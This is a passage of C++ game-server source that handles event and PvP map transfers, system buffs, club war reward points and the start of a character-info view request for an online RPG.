#include "stdafx.h"

#include "./UserTypeDefine.h"

#include "./GLGaeaServer.h"

#include "../../Lib_Engine/Core/NSRParam.h"

#include "./GMCommandPass.h"
#include "./GLSetOption.h"

#include "./PVPPartyBattleGroundsField.h"
#include "./PVPPartyBattleGroundsMsg.h"

#include "VirtualizerSDK.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/*event map move, Juver, 2017/08/25 */
BOOL GLGaeaServer::EventMoveMap ( DWORD dwCharID, SNATIVEID sMapID, WORD wPosX, WORD wPosY, BOOL bCheckCurMap /*= TRUE*/, BOOL bCalculatePos /*= TRUE*/ )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )	return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	GLMapAxisInfo sMapAxisInfo;
	D3DXVECTOR3 vPOS(wPosX,0,wPosY); 

	if ( bCalculatePos )
	{
		sMapAxisInfo.LoadFile ( pMapNode->strFile.c_str() );
		sMapAxisInfo.MapPos2MiniPos ( wPosX, wPosY, vPOS.x, vPOS.z );
	}
	
	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPOS;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPOS );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )		pchar->DISABLEBLOW ( i );
			for ( int i=0; i<SKILLFACT_SIZE; ++i )		pchar->DISABLESKEFF ( i );
			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}
/*woe Arc Development 08-06-2024*/
BOOL GLGaeaServer::WoeMoveMap(DWORD dwCharID, SNATIVEID sMapID, D3DXVECTOR3 vPos, BOOL bCheckCurMap /*= TRUE*/)
{
	GLChar* pchar = GetCharID(dwCharID);
	if (!pchar)	return FALSE;

	//player already inside the target map
	if (bCheckCurMap && pchar->m_sMapID == sMapID)	return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if (!pchar->IsValidBody())
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);
		return FALSE;
	}

	if (pchar->m_sCONFTING.IsCONFRONTING())
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);
		return FALSE;
	}

	if (pchar->m_sTrade.Valid())
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);
		return FALSE;
	}

	if (sMapID == NATIVEID_NULL())
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find(sMapID.dwID);
	if (iter == m_MapList.end())
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);
		return FALSE;
	}

	const SMAPNODE* pMapNode = &(*iter).second;

	/*if ( pchar->m_dwUserLvl < USER_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar );
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}*/

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb);

	DropOutPET(pchar->m_dwPetGUID, false, true);
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle(pchar->m_dwClientID, pchar->m_dwGaeaID, false);

	/*skill summon, Juver, 2017/10/09 */
	for (int i = 0; i < SKILL_SUMMON_MAX_CLIENT_NUM; ++i)
		DropOutSummon(pchar->m_dwSummonGUID_FLD[i]);

	if (pMapNode->dwFieldSID != m_dwFieldSvrID)
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT(pchar->m_dwClientID, &netmsgag);
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr(pchar, sMapID, UINT_MAX, vPos);
		if (!bOK)
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT(pchar->m_dwClientID, &netmsgfb2);
			return FALSE;
		}

		if (sCurMapID != pchar->m_sMapID)
		{
			for (int i = 0; i < EMBLOW_MULTI; ++i)		pchar->DISABLEBLOW(i);
			for (int i = 0; i < SKILLFACT_SIZE; ++i)		pchar->DISABLESKEFF(i);
			pchar->DISABLEALLLANDEFF();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT(pchar->m_dwClientID, &netmsgfb2);
	}

	return TRUE;
}
/*pvp tyranny, Juver, 2017/08/25 */
BOOL GLGaeaServer::TyrannyMoveMap ( DWORD dwCharID, SNATIVEID sMapID, D3DXVECTOR3 vPos, BOOL bCheckCurMap, BOOL source_map_check, SNATIVEID source_map_id )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )	return S_OK;

	//only move when player is inside source map
	if ( source_map_check && pchar->m_sMapID != source_map_id ) return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPos );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )		pchar->DISABLEBLOW ( i );
			for ( int i=0; i<SKILLFACT_SIZE; ++i )		pchar->DISABLESKEFF ( i );
			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}

/*pvp tyranny, Juver, 2017/08/25 */
void GLGaeaServer::TyrannyResetBuff( GLMSG::SNETPC_TYRANNY_A2F_BUFF_RESET *pNetMsg )
{
	PGLCHAR pchar  = GetCharID( pNetMsg->dwCharID );
	if ( !pchar )	return;

	pchar->SystemBuffReset( SYSTEM_BUFF_SIZE );

	GLMSG::SNETPC_SYSTEMBUFF_BRD netmsg_systembuff_brd;
	netmsg_systembuff_brd.dwGaeaID = pchar->m_dwGaeaID;

	for( int i=0; i<SYSTEM_BUFF_SIZE; ++i )
		netmsg_systembuff_brd.sSYSTEM_BUFF[i].Assign( pchar->m_sSYSTEM_BUFF[i], i );

	GLGaeaServer::GetInstance().SENDTOCLIENT( pchar->m_dwClientID, &netmsg_systembuff_brd);
	pchar->SendMsgViewAround ( (NET_MSG_GENERIC*) &netmsg_systembuff_brd );
}

/*pvp tyranny, Juver, 2017/08/25 */
void GLGaeaServer::TyrannyRewardBuff( GLMSG::SNETPC_TYRANNY_A2F_BUFF_REWARD *pNetMsg )
{
	PGLCHAR pchar  = GetCharID( pNetMsg->dwCharID );
	if ( !pchar )	return;

	pchar->SystemBuffReset( SYSTEM_BUFF_SIZE );

	//main reward buff
	pchar->SystemBuffAdd( pNetMsg->sRewardBuffMain.sidSkill, pNetMsg->sRewardBuffMain.wLevel, 0 );

	//reward buff
	for( int i=0; i<TYRANNY_REWARD_BUFF_NUM; ++i )
	{
		WORD _wslot = pchar->SystemBuffFindSlot( pNetMsg->sRewardBuff[i].sidSkill );
		pchar->SystemBuffAdd( pNetMsg->sRewardBuff[i].sidSkill, pNetMsg->sRewardBuff[i].wLevel, _wslot );
	}

	GLMSG::SNETPC_SYSTEMBUFF_BRD netmsg_systembuff_brd;
	netmsg_systembuff_brd.dwGaeaID = pchar->m_dwGaeaID;

	for( int i=0; i<SYSTEM_BUFF_SIZE; ++i )
		netmsg_systembuff_brd.sSYSTEM_BUFF[i].Assign( pchar->m_sSYSTEM_BUFF[i], i );

	GLGaeaServer::GetInstance().SENDTOCLIENT( pchar->m_dwClientID, &netmsg_systembuff_brd);
	pchar->SendMsgViewAround ( (NET_MSG_GENERIC*) &netmsg_systembuff_brd );
}

/*pvp tyranny, Juver, 2017/08/25 */
void GLGaeaServer::TyrannyBattleBuff( GLMSG::SNETPC_TYRANNY_A2F_BUFF_BATTLE *pNetMsg )
{
	PGLCHAR pchar  = GetCharID( pNetMsg->dwCharID );
	if ( !pchar )	return;

	pchar->SystemBuffReset( SYSTEM_BUFF_SIZE );

	//battle buff
	for( int i=0; i<TYRANNY_BATTLE_BUFF_NUM; ++i )
	{
		WORD _wslot = pchar->SystemBuffFindSlot( pNetMsg->sBattleBuff[i].sidSkill );
		pchar->SystemBuffAdd( pNetMsg->sBattleBuff[i].sidSkill, pNetMsg->sBattleBuff[i].wLevel, _wslot );

		//CDebugSet::ToFileWithTime( "_pvptyranny.txt", "buff player:[%u]%s buff[%d~%d] %d", pchar->m_dwCharID, pchar->m_szName, 
		//	pNetMsg->sBattleBuff[i].sidSkill.wMainID, pNetMsg->sBattleBuff[i].sidSkill.wSubID, pNetMsg->sBattleBuff[i].wLevel );
	}

	GLMSG::SNETPC_SYSTEMBUFF_BRD netmsg_systembuff_brd;
	netmsg_systembuff_brd.dwGaeaID = pchar->m_dwGaeaID;

	for( int i=0; i<SYSTEM_BUFF_SIZE; ++i )
		netmsg_systembuff_brd.sSYSTEM_BUFF[i].Assign( pchar->m_sSYSTEM_BUFF[i], i );

	GLGaeaServer::GetInstance().SENDTOCLIENT( pchar->m_dwClientID, &netmsg_systembuff_brd);
	pchar->SendMsgViewAround ( (NET_MSG_GENERIC*) &netmsg_systembuff_brd );
}

/*school wars, Juver, 2018/01/19 */
BOOL GLGaeaServer::SchoolWarsMoveMap ( DWORD dwCharID, SNATIVEID sMapID, D3DXVECTOR3 vPos, BOOL bCheckCurMap, BOOL source_map_check, SNATIVEID source_map_id )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )	return S_OK;

	//only move when player is inside source map
	if ( source_map_check && pchar->m_sMapID != source_map_id ) return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPos );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )		pchar->DISABLEBLOW ( i );
			for ( int i=0; i<SKILLFACT_SIZE; ++i )		pchar->DISABLESKEFF ( i );
			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}

/*pvp capture the flag, Juver, 2018/01/29 */
void GLGaeaServer::CaptureTheFlagPlayerTeam( GLMSG::SNETPC_CAPTURE_THE_FLAG_A2F_PLAYER_TEAM *pNetMsg )
{
	PGLCHAR pchar  = GetCharID( pNetMsg->dwCharID );
	if ( !pchar )	return;

	pchar->m_wCaptureTheFlagTeam = pNetMsg->wTeam;

	GLMSG::SNETPC_CAPTURE_THE_FLAG_F2C_PLAYER_TEAM_BRD netmsg_player_team_brd;
	netmsg_player_team_brd.dwGaeaID = pchar->m_dwGaeaID;
	netmsg_player_team_brd.wTeam = pchar->m_wCaptureTheFlagTeam;
	GLGaeaServer::GetInstance().SENDTOCLIENT( pchar->m_dwClientID, &netmsg_player_team_brd);
	pchar->SendMsgViewAround ( (NET_MSG_GENERIC*) &netmsg_player_team_brd );
}

/*pvp capture the flag, Juver, 2018/01/30 */
BOOL GLGaeaServer::CaptureTheFlagMoveMap ( DWORD dwCharID, SNATIVEID sMapID, D3DXVECTOR3 vPos, BOOL bCheckCurMap, BOOL source_map_check, SNATIVEID source_map_id )
{
	GLChar* pchar = GetCharID(dwCharID);
	if ( !pchar )	return FALSE;

	//player already inside the target map
	if ( bCheckCurMap && pchar->m_sMapID == sMapID )	return S_OK;

	//only move when player is inside source map
	if ( source_map_check && pchar->m_sMapID != source_map_id ) return S_OK;

	GLMSG::SNETPC_REQ_EVENT_MOVEMAP_FB	netmsgfb;

	if ( !pchar->IsValidBody() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sCONFTING.IsCONFRONTING() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( pchar->m_sTrade.Valid() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	if ( sMapID==NATIVEID_NULL() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	GLMapList::FIELDMAP_ITER iter = m_MapList.find ( sMapID.dwID );
	if ( iter==m_MapList.end() )
	{
		netmsgfb.emFB = EMEVENT_MOVEMAP_FB_FAIL;
		SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
		return FALSE;
	}

	const SMAPNODE *pMapNode = &(*iter).second;

	if ( pchar->m_dwUserLvl < NSUSER_TYPE::USER_TYPE_GM3 )
	{
		EMREQFAIL emReqFail(EMREQUIRE_COMPLETE);
		const SLEVEL_REQUIRE &sRequire = pMapNode->sLEVEL_REQUIRE;
		emReqFail = sRequire.ISCOMPLETE ( pchar ); 
		if ( emReqFail != EMREQUIRE_COMPLETE )
		{
			netmsgfb.emFB = EMEVENT_MOVEMAP_FB_CONDITION;
			SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );
			return FALSE;
		}
	}

	netmsgfb.emFB = EMEVENT_MOVEMAP_FB_OK;
	SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb );

	DropOutPET ( pchar->m_dwPetGUID,false,true );
	//DropOutSummon ( pchar->m_dwSummonGUID, false );
	SetActiveVehicle( pchar->m_dwClientID, pchar->m_dwGaeaID, false );

	/*skill summon, Juver, 2017/10/09 */
	for ( int i=0; i<SKILL_SUMMON_MAX_CLIENT_NUM; ++i )
		DropOutSummon ( pchar->m_dwSummonGUID_FLD[i] );

	if ( pMapNode->dwFieldSID!=m_dwFieldSvrID )
	{
		GLMSG::SNETPC_REQ_RECALL_AG netmsgag;
		netmsgag.sMAPID = sMapID;
		netmsgag.dwGATEID = UINT_MAX;
		netmsgag.vPOS = vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgag );
	}
	else
	{
		GLMSG::SNETPC_REQ_RECALL_FB	netmsgfb2;
		SNATIVEID sCurMapID = pchar->m_sMapID;

		BOOL bOK = RequestInvenRecallThisSvr ( pchar, sMapID, UINT_MAX, vPos );
		if ( !bOK )
		{
			netmsgfb2.emFB = EMREQ_RECALL_FB_FAIL;
			GLGaeaServer::GetInstance().SENDTOCLIENT ( pchar->m_dwClientID, &netmsgfb2 );
			return FALSE;
		}

		if ( sCurMapID != pchar->m_sMapID )
		{
			for ( int i=0; i<EMBLOW_MULTI; ++i )		pchar->DISABLEBLOW ( i );
			for ( int i=0; i<SKILLFACT_SIZE; ++i )		pchar->DISABLESKEFF ( i );
			pchar->DISABLEALLLANDEFF();

			//pet skill bugfix
			//reset pet when moving to another map
			pchar->m_sPETSKILLFACT_A.RESET ();
			pchar->m_sPETSKILLFACT_B.RESET ();
		}

		pchar->ResetAction();

		netmsgfb2.emFB = EMREQ_RECALL_FB_OK;
		netmsgfb2.sMAPID = sMapID;
		netmsgfb2.vPOS = pchar->m_vPos;
		GLGaeaServer::GetInstance().SENDTOAGENT ( pchar->m_dwClientID, &netmsgfb2 );
	}

	return TRUE;
}

void GLGaeaServer::PVPClubWarSendReward( NET_MSG_GENERIC* nmg )
{
	GLMSG::SNETPC_CLUB_SCORE_A2F_SEND_SCORE* pNetMsg = ( GLMSG::SNETPC_CLUB_SCORE_A2F_SEND_SCORE* ) nmg;

	PGLCHAR pChar = GetCharID( pNetMsg->dwCharID );
	if ( pChar )
	{
		pChar->m_dwContributionPoint += pNetMsg->wRewardPoint;
		GLMSG::SNETPC_UPDATE_CONTRIBUTION_POINT netmsgclient;
		netmsgclient.bNotice = true;
		netmsgclient.dwPoint = pChar->m_dwContributionPoint;
		GLGaeaServer::GetInstance().SENDTOCLIENT( pChar->m_dwClientID, &netmsgclient );

		//pending give rewards later
		//GetConsoleMsg()->Write( "PVPClubWarSendReward [%u]%s %u", pChar->m_dwCharID, pChar->m_szName, pNetMsg->wRewardPoint );
	}
}

/* charinfoview, Juver, 2020/03/03 */
void GLGaeaServer::CharInfoViewRequest( GLMSG::SNETPC_REQ_CHARINFO_FLD *pNetMsg )
{
	PGLCHAR pChar  = GetCharID( pNetMsg->dwCharIDRequested );
	if ( !pChar )	return;

	GLMSG::SNETPC_REQ_CHARINFO_AGT NetMsgAGT;
	NetMsgAGT.dwCharIDViewer = pNetMsg->dwCharIDViewer;
	NetMsgAGT.emFB = EMREQ_CHARINFO_AGT_FB_FAIL;


	{	//send charinfo
		SINFO_CHAR	sCharInfo;
		sCharInfo.dwGaeaID		= pChar->m_dwGaeaID;
		sCharInfo.dwCharID		= pChar->m_dwCharID;
		StringCchCopy ( sCharInfo.szName, CHAR_SZNAME, pChar->m_szName );
		sCharInfo.emClass		= pChar->m_emClass;
		sCharInfo.wSchool		= pChar->m_wSchool;
		sCharInfo.wHair			= pChar->m_wHair;
		sCharInfo.wHairColor	= pChar->m_wHairColor;
		sCharInfo.wFace			= pChar->m_wFace;
		sCharInfo.wLevel		= pChar->m_wLevel;
		sCharInfo.wReborn		= pChar->m_dwReborn;			/* reborn system, Juver, 2021/09/17 */
		sCharInfo.sdDAMAGE.wLow		= pChar->GETFORCE_LOW();
		sCharInfo.sdDAMAGE.wHigh	= pChar->GETFORCE_HIGH();
		sCharInfo.wHP			= pChar->m_sHP.wMax;
		sCharInfo.wMP			= pChar->m_sMP.wMax;
		sCharInfo.wSP			= pChar->m_sSP.wMax;
		sCharInfo.sSUMSTATS		= pChar->m_sSUMSTATS;
		sCharInfo.wSUM_PA		= pChar->m_wSUM_PA;
		sCharInfo.wSUM_SA		= pChar->m_wSUM_SA;
		sCharInfo.wSUM_MA		= pChar->m_wSUM_MA;
		sCharInfo.sSUMRESIST	= pChar->m_sSUMRESIST_SKILL;
		sCharInfo.nSUM_DEF		= pChar->GETDEFENSE();
		sCharInfo.nSUM_HIT		= pChar->GETHIT();
		sCharInfo.nSUM_AVOID	= pChar->GETAVOID();
		sCharInfo.bUseArmSub	= pChar->IsUseArmSub();
		sCharInfo.fScaleRange	= pChar->m_fScaleRange;
		StringCchCopy ( sCharInfo.szBadge, CHAR_SZNAME, pChar->m_szBadge );

		if ( pNetMsg->dwUserLevel < NSUSER_TYPE::USER_TYPE_GM3 && RPARAM::bViewCharAllowPrivate )
		{
			sCharInfo.bPrivate	= pChar->m_bPrivateStats;

			if ( sCharInfo.bPrivate )
